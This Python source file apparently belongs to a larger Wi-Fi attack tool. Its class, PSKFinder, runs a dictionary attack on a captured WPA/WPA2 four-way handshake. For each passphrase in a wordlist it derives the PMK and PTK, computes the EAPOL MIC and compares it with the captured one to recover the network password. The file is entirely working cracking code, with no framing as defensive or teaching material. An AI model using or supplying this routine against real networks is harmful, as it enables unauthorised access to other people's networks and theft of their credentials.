import hashlib
import hmac
import binascii

from scapy.layers.eap import EAPOL


class PSKFinder:
    def __init__(self, dictPath):
        self.dictPath = dictPath
        self.PSK = None
        self.handshake = None
        self.ssid = None

    def run(self):
        try:
            apMac = binascii.unhexlify(self.handshake.apMac.replace(':', '', 5))
            staMac = binascii.unhexlify(self.handshake.staMac.replace(':', '', 5))
            data = min(apMac, staMac) + max(apMac, staMac) + min(self.handshake.aNonce, self.handshake.sNonce) \
                   + max(self.handshake.aNonce, self.handshake.sNonce)
            wpa_data = binascii.hexlify(bytes(self.handshake.PKT2[EAPOL]))
            wpa_data = wpa_data.replace(self.handshake.mic, b"0" * 32)
            wpa_data = binascii.a2b_hex(wpa_data)
            f = open(self.dictPath, "rb")
            #print(f"DestMIC : {self.handshake.mic.decode()}")
            lines = f.readlines()
            for line in lines:
                try:
                    #print(line.decode().strip())
                    PMK = self.calcPMK(line.decode().strip())#strips passPhrase from \n
                    PTK = self.calcPTK(PMK, data)
                    mic = hmac.new(PTK[0:16], wpa_data, "sha1").hexdigest()
                    #print(f"MIC GENED: {mic[:-8]}")
                    if self.compareMics(mic):
                        self.PSK = line.decode().strip()
                        return False
                except Exception as e:
                    print(e)
            return True
        except Exception as e:
            print(e)
            return True


    def calcPMK(self, PSK):
        PMK = hashlib.pbkdf2_hmac('sha1', PSK.encode('ascii'), self.ssid.encode('ascii'), 4096, 32)
        return PMK

    def calcPTK(self, PMK, data):
        blen = 64
        i = 0
        R = b""
        pke = b"Pairwise key expansion"
        while i <= ((blen * 8 + 159) / 160):
            hmacsha1 = hmac.new(PMK, pke + chr(0x00).encode() + data + chr(i).encode(), hashlib.sha1)
            i += 1
            R = R + hmacsha1.digest()

        return R[:blen]

    def compareMics(self, generatedMic):
        if generatedMic[:-8] == self.handshake.mic.decode():
            return True
        return False
